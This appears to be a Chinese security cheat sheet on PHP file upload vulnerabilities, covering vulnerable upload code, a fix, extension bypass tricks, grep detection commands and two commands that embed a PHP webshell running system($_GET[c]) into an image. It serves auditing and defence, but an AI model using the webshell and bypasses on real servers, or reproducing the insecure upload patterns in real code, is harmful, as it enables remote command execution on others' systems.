# PHP 文件上传

## 确认条件

可上传可在服务端执行的文件且可通过HTTP访问。


1. 可上传脚本扩展名（或被绕过）
2. 上传目录可URL直接访问
3. 目录允许脚本执行
4. 文件名可预测（未随机重命名）

## 检测

```php
// 未验证扩展名
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// 仅验证 Content-Type（客户端可控）
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}

// 仅验证 getimagesize（图片马可通过）
if (getimagesize($_FILES['file']['tmp_name'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}

// 黑名单绕过
$deny = ['php', 'asp', 'jsp'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $deny)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// .php5 .phtml .pht .php7 .shtml .phar .phps
```

## 修复

```php
$allowed = ['jpg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('Invalid');

$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($tmp, '/var/www/uploads/' . $new_name);

// Nginx 禁止上传目录执行脚本
// location /uploads/ { location ~ \.php$ { deny all; } }
```

## 扩展名绕过

```
黑名单缺失: .php5 .phtml .pht .php7 .php8 .shtml .phar .phps .inc
Windows:   .php.   .php::$DATA   .php:1.jpg
Apache:    .php.xxx (未知扩展名回退处理)
Nginx:     .php/ 路径解析（配置不当）
```

## 图片马

```bash
exiftool -Comment='<?php system($_GET[c]); ?>' image.jpg
echo '<?php system($_GET[c]); ?>' >> image.jpg
```

## 检测命令

```bash
grep -rn "move_uploaded_file\|files\[\|_FILES" --include="*.php"
grep -rn "pathinfo.*PATHINFO_EXTENSION" --include="*.php"
```
